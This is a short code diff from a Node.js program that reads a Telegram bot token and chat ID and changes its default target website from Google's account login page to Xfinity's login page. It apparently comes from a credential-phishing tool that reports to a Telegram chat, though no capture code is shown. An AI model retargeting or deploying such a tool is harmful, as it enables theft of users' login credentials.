@@ -15,7 +15,7 @@ const TelegramBot = require('node-telegram-bot-api');
 // Platforms like Render use environment variables for secrets. This is secure.
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-const TARGET_WEBSITE = process.env.TARGET_WEBSITE || 'https://accounts.google.com';
+const TARGET_WEBSITE = process.env.TARGET_WEBSITE || 'https://login.xfinity.com';
 
 // --- Essential Checks ---
 if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
